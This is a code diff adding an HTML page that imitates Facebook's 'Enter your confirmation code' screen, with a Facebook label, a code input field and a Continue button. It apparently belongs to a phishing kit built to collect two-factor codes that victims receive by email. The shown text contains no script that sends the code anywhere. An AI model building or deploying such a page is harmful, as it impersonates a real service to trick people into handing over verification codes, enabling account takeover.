@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="assets/1.css" />
+    <link rel="stylesheet" href="assets/2.css" />
+    <link rel="stylesheet" href="assets/3.css" />
+    <link rel="stylesheet" href="assets/LoginPage.css" />
+    <link rel="stylesheet" href="assets/auth.css" />
+</head>
+
+<body>
+    <div class="container">
+
+        <div class="facebook-text">• Facebook</div>
+        <div class="title">Enter your confirmation code</div>
+        <div class="subtitle">We sent an email with your confirmation code to your email.</div>
+
+        <img src="assets/auth_email.jpg" alt="Illustration" class="illustration authsms" />
+
+        <div class="input-box">
+            <input type="text" autocomplete="off" placeholder="Code" id="authCode"
+                class="w-full mb-4 pointer-events-auto py-[16px] px-[15px] cursor-pointer border focus:outline-[#67788a] border-[rgb(203,210,217)] rounded-xl"
+                value="" style="
+     opacity: 1;">
+        </div>
+
+        <div class="timer" style="display: none;"></div>
+
+        <button id="continueBtn" type="submit"
+            class="mb-4 w-full py-2 bg-blue-500 text-white rounded hover:bg-blue-600 focus:outline-none text-[16px]"
+            style="border-radius: 22px; background: rgb(0, 100, 224); 
+ ">Continue</button>
+    </div>
+
+</body>
+
+</html>
